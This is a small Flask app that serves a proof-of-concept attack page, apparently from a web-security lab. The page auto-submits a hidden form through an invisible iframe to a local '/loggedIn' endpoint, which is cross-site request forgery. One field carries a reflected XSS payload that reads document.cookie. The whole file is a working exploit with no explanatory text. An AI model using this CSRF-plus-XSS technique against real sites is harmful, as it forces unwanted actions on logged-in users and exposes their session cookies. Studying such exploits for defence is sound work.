from flask import Flask

app = Flask(__name__)

@app.route("/")
def main():
    return '''
    <!DOCTYPE html>
    <iframe name="hiddenFrame" style="display:none;"></iframe>
    <form target="hiddenFrame" action="http://localhost:80/loggedIn" method="GET">
        <input type="hidden" name="username" value="">
        <input type="hidden" name="moneyAmount" value="<script>alert(document.cookie);</script>">
        <input style="display:none;" type="submit" value="Submit" >
    </form>
    <script>
        window.onload = function() { document.forms[0].submit(); }
    </script>
    '''

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=4446)